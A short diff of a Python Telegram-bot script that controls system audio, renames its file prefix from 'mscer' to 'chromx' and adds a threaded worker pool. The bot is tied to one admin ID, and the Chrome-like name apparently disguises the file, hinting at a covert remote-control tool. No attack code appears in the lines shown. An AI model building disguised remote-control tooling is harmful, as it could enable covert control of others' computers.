@@ -23,11 +23,13 @@ from ctypes import cast, POINTER
 from comtypes import CLSCTX_ALL
 from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
 
-fname = 'mscer' + os.path.splitext(os.path.basename(sys.argv[0]))[1]
+fname = 'chromx' + os.path.splitext(os.path.basename(sys.argv[0]))[1]
 
 token = 'Токен'
 adm = 'Айди'
-bot = telebot.TeleBot(token)
+
+bot = telebot.TeleBot(token, threaded=True)
+bot.worker_pool = util.ThreadPool(num_threads=10)
 
 menu = types.ReplyKeyboardMarkup()
 button1 = types.KeyboardButton('/1\n<<')
